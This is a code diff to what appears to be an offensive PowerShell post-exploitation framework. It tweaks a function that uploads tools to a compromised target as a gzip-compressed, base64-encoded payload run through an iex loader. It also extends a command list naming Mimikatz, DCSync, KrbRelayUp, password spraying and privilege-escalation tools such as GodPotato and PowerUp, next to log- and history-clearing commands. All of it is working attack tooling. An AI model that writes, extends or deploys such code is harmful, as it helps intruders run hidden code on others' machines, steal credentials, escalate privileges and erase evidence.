@@ -472,9 +472,10 @@ function Send-Module {
     $gzs = [System.IO.Compression.GzipStream]::new($ms, [System.IO.Compression.CompressionMode]::Compress)
     $gzs.Write($codeBytes, 0, $codeBytes.Length)
     $gzs.Close()
-    $b64 = [Convert]::ToBase64String($ms.ToArray())
+    $gzBytes = $ms.ToArray()
+    $b64 = [Convert]::ToBase64String($gzBytes)
 
-    Write-Host " [*] Uploading '$ToolName' to target ($([Math]::Round($codeBytes.Length/1KB,0)) KB raw, $([Math]::Round($ms.Length/1KB,0)) KB compressed)..." -ForegroundColor Cyan
+    Write-Host " [*] Uploading '$ToolName' to target ($([Math]::Round($codeBytes.Length/1KB,0)) KB raw, $([Math]::Round($gzBytes.Length/1KB,0)) KB compressed)..." -ForegroundColor Cyan
 
     $cmd = '$_gz=''' + $b64 + ''';$_m=New-Object IO.MemoryStream(,[Convert]::FromBase64String($_gz));$_s=New-Object IO.Compression.GzipStream($_m,[IO.Compression.CompressionMode]::Decompress);$_o=New-Object IO.MemoryStream;$_s.CopyTo($_o);iex ([Text.Encoding]::UTF8.GetString($_o.ToArray()))'
     if ($SessionKey) { $cmd = Protect-PipeMessage -PlainText $cmd -Key $SessionKey }
@@ -3799,7 +3800,7 @@ function InteractWithPipeSession{
 			"ClearLogs", "ClearHistory"
 		)
 
-  		if($command -like "Kerb" -OR $command -like "Invoke-PassSpray*" -OR $command -like "DCSync" -OR $command -like "Access_Check*" -OR $command -like "Find-LocalAdminAccess*" -OR $command -like "Invoke-SessionHunter*" -OR $command -like "AutoMimi*" -OR $command -like "Mimi*" -OR $command -like "KrbRelayUp*"){
+  		if($command -like "Kerb" -OR $command -like "Invoke-PassSpray*" -OR $command -like "DCSync" -OR $command -like "Access_Check*" -OR $command -like "Find-LocalAdminAccess*" -OR $command -like "Invoke-SessionHunter*" -OR $command -like "AutoMimi*" -OR $command -like "Mimi*" -OR $command -like "KrbRelayUp*" -OR $command -like "PrivescCheck" -OR $command -like "PowerUp" -OR $command -like "GodPotato" -OR $command -like "Invoke-PrivescCheck*" -OR $command -like "Invoke-AllChecks*"){
 			$global:RestoreTimeout = $True
 			$timeoutSeconds = 300
 		}
